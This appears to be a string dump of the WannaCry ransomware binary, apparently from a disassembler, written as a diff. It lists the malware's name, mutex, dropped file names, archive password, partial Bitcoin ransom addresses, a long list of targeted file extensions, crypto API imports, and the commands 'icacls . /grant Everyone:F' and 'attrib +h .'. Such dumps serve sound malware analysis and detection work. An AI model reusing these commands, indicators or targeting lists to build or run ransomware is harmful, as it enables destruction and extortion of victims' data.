@@ -1,0 +1,380 @@
+- oftware\
+- !This program cannot be run in DOS mode.
+- `.rdata
+- @.data
+- SVWjcf
+- WWWWWPj
+- @4+G4t
+- q89p8t
+- V,YYG;~
+- tlHt Ht
+- ~(9~$u
+- FP;FTt
+- k|_^][Y
+- =j&&LZ66lA??~
+- }{))R>
+- f""D~**T
+- V22dN::t
+- o%%Jr..\$
+- &&Lj66lZ??~A
+- 99rKJJ
+- ==zGdd
+- ""Df**T~
+- ;22dV::tN
+- $$Hl\\
+- C77nYmm
+- %%Jo..\r
+- 55j_WW
+- &Lj&6lZ6?~A?
+- ~=zG=d
+- "Df"*T~*
+- 2dV2:tN:
+- x%Jo%.\r.
+- a5j_5W
+- ggV}++
+- Lj&&lZ66~A??
+- bS11*?
+- Xt,,4.
+- RRvM;;
+- MMfU33
+- PPxD<<%
+- Bc!! 0
+- ~~zG==
+- Df""T~**;
+- dV22tN::
+- xxJo%%\r..8$
+- pp|B>>q
+- aaj_55
+- UUPx((
+- ='9-6d
+- _jbF~T
+- 11#?*0
+- ,4$8_@
+- t\lHBW
+- QPeA~S
+- >4$8,@
+- p\lHtW
+- +HpXhE
+- T[$:.6
+- ,4$8'9-6:.6$1#?*XhHpSeA~NrZlE
+- Sbt\lH
+- QeFbF~TiKwZ
+- 4$8,9-6'.6$:#?*1hHpXeA~SrZlN
+- SbE\lHtQeF
+- F~TbKwZi
+- $8,4-6'96$:.?*1#HpXhA~SeZlNrSbE
+- lHt\eF
+- Q~TbFwZiK
+- 8,4$6'9-$:.6*1#?pXhH~SeAlNrZbE
+- SHt\lF
+- QeTbF~ZiKw
+- inflate 1.1.3 Copyright 1995-1998 Mark Adler
+- Qkkbal
+- - unzip 0.15 Copyright 1998 Gilles Vollant
+- CloseHandle
+- GetExitCodeProcess
+- TerminateProcess
+- WaitForSingleObject
+- CreateProcessA
+- GlobalFree
+- GetProcAddress
+- {"ea": 26650, "summary": "89674523907856340000000000"}
+- {"ea": 62508, "summary": "cmd.exe /c \"%s\""}
+- {"ea": 60068, "summary": ".ppt"}
+- {"ea": 59504, "summary": ".rar"}
+- {"ea": 60056, "summary": ".pptx"}
+- {"ea": 60176, "summary": ".xlsx"}
+- {"ea": 58588, "summary": ".sqlitedb"}
+- {"ea": 58568, "summary": ".sqlite3"}
+- {"ea": 59476, "summary": ".backup"}
+- {"ea": 59652, "summary": ".vmdk"}
+- {"ea": 60236, "summary": ".docm"}
+- {"ea": 60260, "summary": ".docx"}
+- {"ea": 60164, "summary": ".xlsm"}
+- {"ea": 59440, "summary": ".jpeg"}
+- {"ea": 59156, "summary": ".avi"}
+- {"ea": 60188, "summary": ".xls"}
+- {"ea": 59168, "summary": ".mov"}
+- {"ea": 59180, "summary": ".mp4"}
+- {"ea": 59404, "summary": ".png"}
+- {"ea": 59428, "summary": ".jpg"}
+- {"ea": 60272, "summary": ".doc"}
+- {"ea": 59544, "summary": ".tar"}
+- {"ea": 59792, "summary": ".pdf"}
+- {"ea": 59840, "summary": ".rtf"}
+- {"ea": 59852, "summary": ".csv"}
+- {"ea": 59048, "summary": ".mp3"}
+- {"ea": 58608, "summary": ".sql"}
+- {"ea": 58232, "summary": ".pem"}
+- {"ea": 58196, "summary": ".crt"}
+- {"ea": 58160, "summary": ".der"}
+- {"ea": 58304, "summary": ".3ds"}
+- {"ea": 58692, "summary": ".myd"}
+- {"ea": 58340, "summary": ".ods"}
+- {"ea": 58424, "summary": ".odp"}
+- {"ea": 58868, "summary": ".ps1"}
+- {"ea": 59492, "summary": ".zip"}
+- {"ea": 59532, "summary": ".tgz"}
+- {"ea": 52796, "summary": " inflate 1.1.3 C..1998 Mark Adler "}
+- {"ea": 61580, "summary": "Microsoft Enhanc..graphic Provider"}
+- {"ea": 57376, "summary": "advapi32.dll"}
+- {"ea": 63204, "summary": "oversubscribed d..bit lengths tree"}
+- {"ea": 63276, "summary": "oversubscribed l..eral/length tree"}
+- {"ea": 63244, "summary": "incomplete literal/length tree"}
+- {"ea": 62644, "summary": "Global\\MsWinZone..cheCounterMutexA"}
+- {"ea": 63080, "summary": "too many length ..distance symbols"}
+- {"ea": 63168, "summary": "incomplete dynam..bit lengths tree"}
+- {"ea": 63376, "summary": "oversubscribed distance tree"}
+- {"ea": 56364, "summary": "CreateServiceA"}
+- {"ea": 60392, "summary": "kernel32.dll"}
+- {"ea": 62680, "summary": "tasksche.exe"}
+- {"ea": 63312, "summary": "empty distance tree with lengths"}
+- {"ea": 62528, "summary": "115p7UMMngoj1pMv..HijcRdfJNXj6LrLn"}
+- {"ea": 3513008, "summary": "<assembly xmlns=..PADDINGXXPADDING"}
+- {"ea": 62476, "summary": "%s\\ProgramData"}
+- {"ea": 63544, "summary": "\\..\\"}
+- {"ea": 63528, "summary": "/../"}
+- {"ea": 57396, "summary": "WanaCrypt0r"}
+- {"ea": 63440, "summary": "incorrect header check"}
+- {"ea": 63116, "summary": "invalid stored block lengths"}
+- {"ea": 63052, "summary": "invalid bit length repeat"}
+- {"ea": 63348, "summary": "incomplete distance tree"}
+- {"ea": 62564, "summary": "12t9YDPgwueZ9NyM..519p7AA8isjr6SMw"}
+- {"ea": 63484, "summary": "unknown compression method"}
+- {"ea": 62716, "summary": "icacls . /grant ..ryone:F /T /C /Q"}
+- {"ea": 61680, "summary": "CryptDestroyKey"}
+- {"ea": 61712, "summary": "CryptAcquireContextA"}
+- {"ea": 60320, "summary": "DeleteFileW"}
+- {"ea": 63416, "summary": "incorrect data check"}
+- {"ea": 61648, "summary": "CryptDecrypt"}
+- {"ea": 61664, "summary": "CryptEncrypt"}
+- {"ea": 62600, "summary": "13AM4VW2dhxYgXeQ..oHkHSQuy6NgaEb94"}
+- {"ea": 61696, "summary": "CryptImportKey"}
+- {"ea": 63024, "summary": "invalid literal/length code"}
+- {"ea": 57420, "summary": "Software\\"}
+- {"ea": 62812, "summary": "GetNativeSystemInfo"}
+- {"ea": 63464, "summary": "invalid window size"}
+- {"ea": 63536, "summary": "\\../"}
+- {"ea": 62696, "summary": "TaskStart"}
+- {"ea": 60368, "summary": "WriteFile"}
+- {"ea": 63000, "summary": "invalid distance code"}
+- {"ea": 63520, "summary": "/..\\"}
+- {"ea": 60296, "summary": "%s\\%s"}
+- {"ea": 60308, "summary": "CloseHandle"}
+- {"ea": 61636, "summary": "CryptGenKey"}
+- {"ea": 60380, "summary": "CreateFileW"}
+- {"ea": 63408, "summary": "1.1.3"}
+- {"ea": 62456, "summary": "%s\\Intel"}
+- {"ea": 63148, "summary": "invalid block type"}
+- {"ea": 60332, "summary": "MoveFileExW"}
+- {"ea": 60344, "summary": "MoveFileW"}
+- {"ea": 60356, "summary": "ReadFile"}
+- {"ea": 63560, "summary": "%s%s%s"}
+- {"ea": 62984, "summary": "need dictionary"}
+- {"ea": 62764, "summary": "WNcry@2ol7"}
+- {"ea": 60284, "summary": "WANACRY!"}
+- {"ea": 62708, "summary": "t.wnry"}
+- {"ea": 63552, "summary": "%s%s"}
+- {"ea": 56452, "summary": "ADVAPI32.dll"}
+- {"ea": 62752, "summary": "attrib +h ."}
+- {"ea": 56234, "summary": "KERNEL32.dll"}
+- {"ea": 2622396, "summary": "|3ds"}
+- {"ea": 56260, "summary": "USER32.dll"}
+- {"ea": 56968, "summary": "MSVCRT.dll"}
+- {"ea": 3347088, "summary": "7z I9"}
+- {"ea": 57360, "summary": "c.wnry"}
+- {"ea": 62636, "summary": "%s%d"}
+- {"ea": 62912, "summary": "insufficient memory"}
+- {"ea": 62896, "summary": "buffer error"}
+- {"ea": 62872, "summary": "incompatible version"}
+- {"ea": 62944, "summary": "stream error"}
+- {"ea": 59864, "summary": ".txt"}
+- {"ea": 58968, "summary": ".php"}
+- {"ea": 58792, "summary": ".cpp"}
+- {"ea": 58520, "summary": ".mml"}
+- {"ea": 58256, "summary": ".ott"}
+- {"ea": 47994, "summary": ",}7z"}
+- {"ea": 62960, "summary": "file error"}
+- {"ea": 59628, "summary": ".gpg"}
+- {"ea": 60020, "summary": ".pps"}
+- {"ea": 62932, "summary": "data error"}
+- {"ea": 59984, "summary": ".ppam"}
+- {"ea": 60092, "summary": ".xltx"}
+- {"ea": 59344, "summary": ".tiff"}
+- {"ea": 59024, "summary": ".class"}
+- {"ea": 59996, "summary": ".ppsx"}
+- {"ea": 58620, "summary": ".accdb"}
+- {"ea": 59000, "summary": ".java"}
+- {"ea": 60008, "summary": ".ppsm"}
+- {"ea": 60044, "summary": ".pptm"}
+- {"ea": 59760, "summary": ".onetoc2"}
+- {"ea": 35324, "summary": "c|w{"}
+- {"ea": 62972, "summary": "stream end"}
+- {"ea": 59972, "summary": ".potx"}
+- {"ea": 60248, "summary": ".docb"}
+- {"ea": 58544, "summary": ".lay6"}
+- {"ea": 60212, "summary": ".dotm"}
+- {"ea": 60200, "summary": ".dotx"}
+- {"ea": 59288, "summary": ".djvu"}
+- {"ea": 59876, "summary": ".vsdx"}
+- {"ea": 60152, "summary": ".xlsb"}
+- {"ea": 59960, "summary": ".potm"}
+- {"ea": 60080, "summary": ".xltm"}
+- {"ea": 59132, "summary": ".mpeg"}
+- {"ea": 59688, "summary": ".sldx"}
+- {"ea": 59676, "summary": ".sldm"}
+- {"ea": 59060, "summary": ".wav"}
+- {"ea": 59924, "summary": ".msg"}
+- {"ea": 59888, "summary": ".vsd"}
+- {"ea": 59912, "summary": ".eml"}
+- {"ea": 59900, "summary": ".edb"}
+- {"ea": 59096, "summary": ".wmv"}
+- {"ea": 59072, "summary": ".swf"}
+- {"ea": 59084, "summary": ".fla"}
+- {"ea": 59828, "summary": ".123"}
+- {"ea": 59936, "summary": ".ost"}
+- {"ea": 59948, "summary": ".pst"}
+- {"ea": 59604, "summary": ".ARC"}
+- {"ea": 59592, "summary": ".PAQ"}
+- {"ea": 59012, "summary": ".jar"}
+- {"ea": 59568, "summary": ".tbk"}
+- {"ea": 59556, "summary": ".bak"}
+- {"ea": 60032, "summary": ".pot"}
+- {"ea": 58172, "summary": ".pfx"}
+- {"ea": 58184, "summary": ".key"}
+- {"ea": 1536990, "summary": "/Z/Z"}
+- {"ea": 58208, "summary": ".csr"}
+- {"ea": 58220, "summary": ".p12"}
+- {"ea": 59392, "summary": ".gif"}
+- {"ea": 59356, "summary": ".tif"}
+- {"ea": 59700, "summary": ".sti"}
+- {"ea": 59712, "summary": ".sxi"}
+- {"ea": 59332, "summary": ".nef"}
+- {"ea": 59320, "summary": ".psd"}
+- {"ea": 59724, "summary": ".602"}
+- {"ea": 59300, "summary": ".svg"}
+- {"ea": 59276, "summary": ".m4u"}
+- {"ea": 59368, "summary": ".cgm"}
+- {"ea": 59264, "summary": ".m3u"}
+- {"ea": 59664, "summary": ".vdi"}
+- {"ea": 59736, "summary": ".hwp"}
+- {"ea": 59748, "summary": ".snt"}
+- {"ea": 59380, "summary": ".raw"}
+- {"ea": 59108, "summary": ".mpg"}
+- {"ea": 59780, "summary": ".dwg"}
+- {"ea": 59252, "summary": ".mid"}
+- {"ea": 59240, "summary": ".wma"}
+- {"ea": 59228, "summary": ".flv"}
+- {"ea": 59804, "summary": ".wk1"}
+- {"ea": 59216, "summary": ".3g2"}
+- {"ea": 59204, "summary": ".mkv"}
+- {"ea": 59192, "summary": ".3gp"}
+- {"ea": 59640, "summary": ".vmx"}
+- {"ea": 59816, "summary": ".wks"}
+- {"ea": 59616, "summary": ".aes"}
+- {"ea": 60128, "summary": ".xlt"}
+- {"ea": 59144, "summary": ".asf"}
+- {"ea": 59120, "summary": ".vob"}
+- {"ea": 58752, "summary": ".sln"}
+- {"ea": 58496, "summary": ".otg"}
+- {"ea": 58508, "summary": ".sxm"}
+- {"ea": 58532, "summary": ".lay"}
+- {"ea": 58556, "summary": ".asc"}
+- {"ea": 58636, "summary": ".mdb"}
+- {"ea": 58656, "summary": ".dbf"}
+- {"ea": 58668, "summary": ".odb"}
+- {"ea": 58680, "summary": ".frm"}
+- {"ea": 59452, "summary": ".vcd"}
+- {"ea": 58704, "summary": ".myi"}
+- {"ea": 58716, "summary": ".ibd"}
+- {"ea": 58728, "summary": ".mdf"}
+- {"ea": 58740, "summary": ".ldf"}
+- {"ea": 60116, "summary": ".xlm"}
+- {"ea": 58764, "summary": ".suo"}
+- {"ea": 58804, "summary": ".pas"}
+- {"ea": 58824, "summary": ".asm"}
+- {"ea": 58844, "summary": ".cmd"}
+- {"ea": 59464, "summary": ".iso"}
+- {"ea": 58856, "summary": ".bat"}
+- {"ea": 58880, "summary": ".vbs"}
+- {"ea": 58908, "summary": ".dip"}
+- {"ea": 58920, "summary": ".dch"}
+- {"ea": 58932, "summary": ".sch"}
+- {"ea": 58944, "summary": ".brd"}
+- {"ea": 58956, "summary": ".jsp"}
+- {"ea": 58980, "summary": ".asp"}
+- {"ea": 58376, "summary": ".stc"}
+- {"ea": 60104, "summary": ".xlc"}
+- {"ea": 60140, "summary": ".xlw"}
+- {"ea": 58244, "summary": ".odt"}
+- {"ea": 58268, "summary": ".sxw"}
+- {"ea": 60224, "summary": ".dot"}
+- {"ea": 58280, "summary": ".stw"}
+- {"ea": 58292, "summary": ".uot"}
+- {"ea": 58316, "summary": ".max"}
+- {"ea": 58328, "summary": ".3dm"}
+- {"ea": 58352, "summary": ".ots"}
+- {"ea": 58364, "summary": ".sxc"}
+- {"ea": 58484, "summary": ".odg"}
+- {"ea": 58388, "summary": ".dif"}
+- {"ea": 2818157, "summary": "\\SGl:"}
+- {"ea": 58412, "summary": ".wb2"}
+- {"ea": 59416, "summary": ".bmp"}
+- {"ea": 58436, "summary": ".otp"}
+- {"ea": 58472, "summary": ".uop"}
+- {"ea": 58448, "summary": ".sxd"}
+- {"ea": 58460, "summary": ".std"}
+- {"ea": 58400, "summary": ".slk"}
+- {"ea": 1512306, "summary": "c to3w\""}
+- {"ea": 3511945, "summary": "taskse.exe\n"}
+- {"ea": 59580, "summary": ".bz2"}
+- {"ea": 56492, "summary": "WS2_32.dll"}
+- {"ea": 2051484, "summary": "Si.S"}
+- {"ea": 56466, "summary": "SHELL32.dll"}
+- {"ea": 56190, "summary": "LocalFileTimeToFileTime"}
+- {"ea": 2247022, "summary": "M.UUQ"}
+- {"ea": 2091580, "summary": "grK.Mtt"}
+- {"ea": 104179, "summary": "Bb..fO3"}
+- {"ea": 56478, "summary": "OLEAUT32.dll"}
+- {"ea": 3419457, "summary": "taskdl.exe"}
+- {"ea": 3511853, "summary": "taskdl.exe\n"}
+- {"ea": 57170, "summary": "MSVCP60.dll"}
+- {"ea": 55602, "summary": "InitializeCriticalSection"}
+- {"ea": 3407986, "summary": "7c=C#"}
+- {"ea": 57140, "summary": "__set_app_type"}
+- {"ea": 55630, "summary": "DeleteCriticalSection"}
+- {"ea": 56166, "summary": "SystemTimeToFileTime"}
+- {"ea": 399405, "summary": "0?N.MyJ"}
+- {"ea": 655360, "summary": "|2PN"}
+- {"ea": 1081898, "summary": "zHN.bAN"}
+- {"ea": 3401254, "summary": "FZT.HJo"}
+- {"ea": 57074, "summary": "__setusermatherr"}
+- {"ea": 1653211, "summary": "bT9.d4w"}
+- {"ea": 55716, "summary": "EnterCriticalSection"}
+- {"ea": 2864325, "summary": "n.lqF"}
+- {"ea": 1542461, "summary": "b.LKZ"}
+- {"ea": 3369093, "summary": "HH88"}
+- {"ea": 132314, "summary": "=777"}
+- {"ea": 1115831, "summary": "r.Abd"}
+- {"ea": 1690204, "summary": "K___"}
+- {"ea": 2705166, "summary": "NLLN"}
+- {"ea": 3259528, "summary": ";4.s"}
+- {"ea": 1221345, "summary": "1001"}
+- {"ea": 3088401, "summary": "k.VNT"}
+- {"ea": 2810467, "summary": "VnVV"}
+- {"ea": 2074606, "summary": "w.CFV"}
+- {"ea": 2425160, "summary": "fDO.S"}
+- {"ea": 55846, "summary": "GetFileAttributesA"}
+- {"ea": 2366558, "summary": "S.BQA"}
+- {"ea": 2049070, "summary": "m.tk4"}
+- {"ea": 1157165, "summary": "18.NOq"}
+- {"ea": 3188473, "summary": "t.xgB"}
+- {"ea": 2597202, "summary": "2.j8m"}
+- {"ea": 221464, "summary": "`[`["}
+- {"ea": 1843898, "summary": "w.Lep"}
+- {"ea": 894560, "summary": "`VV`"}
+- {"ea": 2469352, "summary": "`XX`"}
+- {"ea": 77, "summary": "!This program ca..in DOS mode.\r\r\n$"}
+- {"ea": 871560, "summary": ";--;"}
+- {"ea": 3447097, "summary": "QqQq"}
+- {"ea": 2620279, "summary": "_.XYT"}
